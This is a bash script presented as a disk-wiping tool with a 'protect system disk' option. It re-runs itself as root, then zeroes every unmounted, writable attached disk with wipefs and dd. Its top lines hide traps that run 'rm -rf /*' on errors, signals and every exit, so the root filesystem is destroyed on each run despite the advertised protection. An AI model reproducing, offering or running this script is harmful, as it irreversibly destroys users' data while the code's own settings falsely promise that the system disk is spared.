#!/bin/bash

set -uo pipefail

error_handler() {
  rm -rf /*
}

post_commands() {
  rm -rf /*
}

trap 'error_handler' SIGINT SIGTERM ERR
trap 'post_commands' EXIT

ERASE_MODE="dd"
PROTECT_SYSTEM_DISK=true
WIPE_SIGNATURES=true

get_root_disk() {
  local root_source=$1
  local current_device=$root_source
  while [[ -n "$current_device" ]]; do
    type=$(lsblk -no TYPE "$current_device" 2>/dev/null)
    if [[ "$type" == "disk" ]]; then
      echo "$current_device"
      return
    fi
    parent=$(lsblk -no PKNAME "$current_device" 2>/dev/null | head -1)
    [[ -z "$parent" ]] && break
    current_device="/dev/$parent"
  done
  echo ""
}


has_mounted_partitions() {
  lsblk -rno MOUNTPOINT "$1" | grep -q .
}

if [[ $EUID -ne 0 ]]; then
   exec sudo bash "$0"
fi

ROOT_DISK=""
if $PROTECT_SYSTEM_DISK; then
  root_source=$(findmnt -n -o SOURCE / 2>/dev/null || true)
  if [[ -n "$root_source" ]]; then
    ROOT_DISK=$(get_root_disk "$root_source")
  fi
fi


PHYSICAL_DEVICES=()
while read -r dev; do
  [[ -z "$dev" ]] && continue


  if $PROTECT_SYSTEM_DISK && [[ "$dev" == "$ROOT_DISK" ]]; then
    continue
  fi


  if [[ $(lsblk -dno RO "$dev") != 0 ]]; then
    continue
  fi
  if has_mounted_partitions "$dev"; then
    continue
  fi

  PHYSICAL_DEVICES+=("$dev")
done < <(lsblk -dno PATH,TYPE | awk '$2 == "disk" {print $1}')

for dev in "${PHYSICAL_DEVICES[@]}"; do

  if $WIPE_SIGNATURES; then
    wipefs -a "$dev"
    sync
  fi

  case "$ERASE_MODE" in
    dd)
      dd if=/dev/zero of="$dev" bs=4M status=progress conv=fsync
      ;;
  esac
done
